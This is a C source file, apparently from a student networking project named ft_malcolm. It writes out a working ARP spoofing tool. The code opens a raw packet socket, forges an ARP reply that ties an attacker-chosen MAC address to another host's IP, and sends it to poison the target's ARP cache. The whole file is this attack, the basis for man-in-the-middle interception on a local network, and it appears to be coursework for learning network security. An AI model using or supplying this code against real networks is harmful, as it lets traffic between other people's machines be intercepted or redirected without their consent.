
#include "ft_malcolm.h"


static void	gen_arp_packet(unsigned char *buffer, char *srcip, char *srcmac, char *dstip, char *dstmac)
{
	struct ethhdr *eth = (struct ethhdr *)buffer;
	struct ether_arp *arp = (struct ether_arp *)(buffer + sizeof(struct ethhdr));

	sscanf(dstmac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
		   &eth->h_source[0], &eth->h_source[1], &eth->h_source[2],
		   &eth->h_source[3], &eth->h_source[4], &eth->h_source[5]);
	sscanf(srcmac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
		   &eth->h_dest[0], &eth->h_dest[1], &eth->h_dest[2],
		   &eth->h_dest[3], &eth->h_dest[4], &eth->h_dest[5]);
	
	eth->h_proto = htons(ETH_P_ARP);
	arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp->ea_hdr.ar_pro = htons(ETH_P_IP);
	arp->ea_hdr.ar_hln = ETH_ALEN;
	arp->ea_hdr.ar_pln = sizeof(in_addr_t);
	arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
	sscanf(srcmac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
		   &arp->arp_sha[0], &arp->arp_sha[1], &arp->arp_sha[2],
		   &arp->arp_sha[3], &arp->arp_sha[4], &arp->arp_sha[5]);
	inet_pton(AF_INET, srcip, &arp->arp_spa);
	inet_pton(AF_INET, dstip, &arp->arp_tpa);
}

void send_arp_spoof(int sockfd, const int interface, unsigned char *buffer) {
	struct sockaddr_ll sa;

	ft_memset(&sa, 0, sizeof(sa));
	sa.sll_family = AF_PACKET;
	sa.sll_ifindex = interface;
	if (sendto(sockfd, buffer, 60, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		ft_exit("Error while sending arp request!", 1);
	printf("%sARP spoofing packet sent%s", GREEN, RESETN);
}

void    ft_malcolm(char *srcip, char *srcmac, char *dstip, char *dstmac, const int interface)
{
	unsigned char	buffer[100];

	ft_memset(buffer, 0, sizeof(buffer));
	if ((socketfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
		ft_exit("Error while opening socket!", 1);
	gen_arp_packet(buffer, srcip, srcmac, dstip, dstmac);
    readpacket(srcip, dstip);
	send_arp_spoof(socketfd, interface, buffer);
	close(socketfd);
}